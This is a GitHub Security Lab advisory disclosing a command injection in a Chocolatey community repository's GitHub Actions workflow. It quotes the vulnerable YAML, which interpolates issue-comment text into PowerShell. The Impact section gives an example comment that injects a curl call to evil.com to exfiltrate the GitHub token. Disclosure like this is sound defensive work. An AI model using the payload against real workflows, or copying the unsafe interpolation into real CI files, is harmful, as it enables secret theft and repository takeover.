<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-189: Command injection in chocolatey-community/chocolatey-package-requests workflow</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/16/2020: Report sent to owner</li>
  <li>29/10/2020: Owner acknowledges</li>
  <li>30/10/2020: Issue fixed</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/chocolatey-community/chocolatey-package-requests/blob/master/.github/workflows/handle-comments.yml">‘handle-comments.yml’ GitHub workflow</a> is vulnerable to arbitrary command injection.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/chocolatey-community/chocolatey-package-requests">chocolatey-community/chocolatey-package-requests GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p><a href="https://github.com/chocolatey-community/chocolatey-package-requests/blob/master/.github/workflows/handle-comments.yml">handle-comments.yml</a> from the master branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-the-public-github-issue-comment-is-used-to-format-a-shell-command">Issue: The public GitHub issue comment is used to format a shell command</h3>

<p>When a user comments on a public issue with <code class="language-plaintext highlighter-rouge">/recheck</code> it automatically starts the <a href="https://github.com/chocolatey-community/chocolatey-package-requests/blob/master/.github/workflows/handle-comments.yml">handle-comments.yml</a> GitHub workflow. The comment text is used to format a powershell script.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="na">recheck_pkgs</span><span class="pi">:</span>
    <span class="na">if</span><span class="pi">:</span> <span class="s">${{ (needs.comments.outputs.success == 'True' || startsWith(github.event.comment.body, '/recheck')) &amp;&amp; github.event.issue.state == 'open' }}</span>
<span class="nn">...</span>
    <span class="na">steps</span><span class="pi">:</span>
<span class="nn">...</span>
      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Validate Issue</span>
        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
          <span class="s">Import-Module "${{ github.workspace }}\scripts\validation.psm1"</span>
          <span class="s">if ("${{ github.event.comment.body }}" -match "^/recheck") {</span>
            <span class="s">Test-NewIssue -commentId ${{ github.event.comment.id }} -repository "${{ github.event.repository.full_name }}"</span>
          <span class="s">} else {</span>
            <span class="s">Test-NewIssue -issueNumber ${{ github.event.issue.number }} -repository "${{ github.event.repository.full_name }}"</span>
          <span class="s">}</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary command injection into the powershell script. For example a user may comment on an issue <code class="language-plaintext highlighter-rouge">/recheck" -match "^/recheck" -and (curl http://evil.com?t=$Env:GITHUB_TOKEN) -and "/recheck</code> which will exfiltrate the secret GitHub access token to the attacker controlled server, that may lead to the repository being compromised. To make the attack less visible the attacker may modify the comment later.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-189</code> in any communication regarding this issue.</p>
